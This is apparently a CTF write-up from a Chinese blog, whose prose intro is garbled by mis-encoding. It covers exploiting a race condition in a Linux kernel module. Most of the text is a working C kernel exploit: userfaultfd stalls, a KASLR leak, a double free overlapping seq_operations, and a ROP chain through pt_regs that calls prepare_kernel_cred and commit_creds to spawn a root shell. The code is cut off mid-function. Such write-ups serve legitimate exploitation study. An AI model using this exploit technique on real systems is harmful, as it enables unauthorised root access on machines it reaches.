<p>è¿˜æ˜¯ä¸å¤ªèƒ½æ‰¾åˆ°æ¡ä»¶ç«äº‰çš„æ´ï¼Œå°±æ¯”å¦‚è¿™é“é¢˜ï¼Œæ„Ÿè§‰è¿™ç§æ¡ä»¶ç«äº‰åˆ†æçš„æ—¶å€™å°±å¾—åœ¨å¯ä»¥é˜»å¡çš„ä½ç½®åœä¸‹æ¥ï¼Œæ€è€ƒå¦‚æœè¿™æ—¶å€™é˜»å¡ï¼Œå…¶ä»–çº¿ç¨‹è¿›æ¥ä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…ï¼Œç„¶åè¿˜æœ‰æ€è€ƒé˜»å¡å‰ç¨‹åºåšäº†ä»€ä¹ˆï¼Œé˜»å¡åç¨‹åºåšäº†ä»€ä¹ˆï¼Œè¿™ä¹ˆä¼šæ¯”è¾ƒå¥½åˆ†æå‡ºæ¡ä»¶ç«äº‰å¦‚ä½•åˆ©ç”¨ï¼Œé€šè¿‡è¿™é“é¢˜è¿˜å­¦åˆ°äº†ä¸¤æ‰‹ï¼Œä¸€æ‰‹æ˜¯åœ¨é˜»å¡çš„ç©ºçª—æœŸæˆ‘ä»¬æƒ³è¦æ‰§è¡ŒæŸäº›ä»»åŠ¡ï¼Œå¯ä»¥ç›´æ¥æ”¾åœ¨userfaultfdçš„å¤„ç†å‡½æ•°ä¸­ï¼Œè¿™æ ·å¯ä»¥å®Œç¾åˆ©ç”¨ç©ºçª—æœŸï¼Œå¦‚æœéœ€è¦å¹¶å‘çš„è¯ï¼Œå®Œå…¨å¯ä»¥åœ¨å¤„ç†å‡½æ•°ä¸­åˆ›å»ºçº¿ç¨‹ç„¶åä½¿ç”¨waitå‡½æ•°ç­‰å¾…æ‰€æœ‰çº¿ç¨‹å…¨éƒ¨ç»“æŸè¿è¡Œç„¶åå†å»å¤„ç†ç¼ºé¡µï¼ŒäºŒæ‰‹æ˜¯åŸæ¥å†…æ ¸ä¹Ÿå¯ä»¥doublefree,è¿™é“é¢˜çš„åˆ©ç”¨å°±æ˜¯å…ˆdoublefreeä¸€ä¸ª0x20çš„å †ï¼Œç„¶åæ‰“å¼€ä¸€ä¸ªstatç”³è¯·ä¸€ä¸ª0x20çš„seq_operationï¼Œæ­¤æ—¶ä¸‹æ¬¡ç”³è¯·ä¸€ä¸ª0x20çš„å †è¿˜æ˜¯ä¼šç”³è¯·åˆ°seq_opsrationï¼Œä¹Ÿå°±èƒ½æ”¹seq_operationçš„startæŒ‡é’ˆäº†ï¼Œæœ€åä½¿ç”¨ä¸€ä¸ª<code>add rsp,xxx</code>çš„gadgetè¿ç§»åˆ°<strong>pt_regs</strong>ä¸Šè¿›è¡Œrop.</p>
<h4 id="è„šæœ¬-2"><a href="#è„šæœ¬-2" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tty.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add_rsp_0x10_ret 0xffffffff815afc83</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add_rsp_0x38_ret 0xffffffff815b29f1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add_rsp_pop_rbx_r12_r13_rbp_ret    0xffffffff8145523f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add_rsp_0x1c8_pop_6_ret 0xffffffff814d51c0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> init_cred 0xffffffff815573b0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds 0xffffffff81069c10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred 0xffffffff81069e00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret 0xffffffff81034505</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret 0xffffffff810001cc</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81600a34+0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mov_rdi_rax_pop_rbp_ret 0xffffffff8121f89a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> mov_rdi_rax_pop_rbp_ret_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> swapgs_restore_regs_and_return_to_usermode_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi_ret_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> ret_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="keyword">int</span> stack_fd=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> seq_fd[<span class="number">0x200</span>];</span><br><span class="line"><span class="keyword">size_t</span> kernel_msg;</span><br><span class="line"><span class="keyword">size_t</span> value;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> * msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    ioctl(stack_fd,<span class="number">0x57AC0001</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">(<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    ioctl(stack_fd,<span class="number">0x57AC0002</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">leak_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        del(&amp;kernel_msg);</span><br><span class="line">        kernel_base=kernel_msg<span class="number">-0x13be80</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*]kernel_base:%p\033[0m\n&quot;</span>,kernel_base);</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">doublefree_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        del(&amp;value);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> stat_rop_fd=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">stat_rop_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x200</span>;i++)&#123;</span><br><span class="line">            close(seq_fd[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        mov_rdi_rax_pop_rbp_ret_addr=mov_rdi_rax_pop_rbp_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        prepare_kernel_cred_addr=prepare_kernel_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        commit_creds_addr=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        init_cred_addr=init_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        pop_rdi_ret_addr=pop_rdi_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        ret_addr=ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        swapgs_restore_regs_and_return_to_usermode_addr=swapgs_restore_regs_and_return_to_usermode-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">        __asm__(</span><br><span class="line">            <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, pop_rdi_ret_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, prepare_kernel_cred_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, mov_rdi_rax_pop_rbp_ret_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, commit_creds_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9, swapgs_restore_regs_and_return_to_usermode_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8,    0x66666666;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, stat_rop_fd;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, 0x200;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">        );</span><br><span class="line">        usr_shell();</span><br><span class="line"></span><br><span class="line">        <span 